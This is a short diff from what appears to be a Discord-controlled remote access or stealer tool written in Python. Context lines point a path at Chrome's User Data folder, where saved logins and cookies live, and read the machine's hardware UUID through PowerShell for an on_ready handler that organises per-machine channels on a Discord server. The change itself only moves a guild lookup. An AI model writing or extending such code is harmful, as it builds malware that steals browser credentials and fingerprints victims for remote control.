@@ -44,10 +44,11 @@ CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.e
 
 @client.event
 async def on_ready():
-    global guild
-    guild = client.get_guild(serverID)
     first_run = True
     global hwid
+    
+    guild = client.get_guild(serverID)
+    
     hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    
     for category_name in guild.categories:
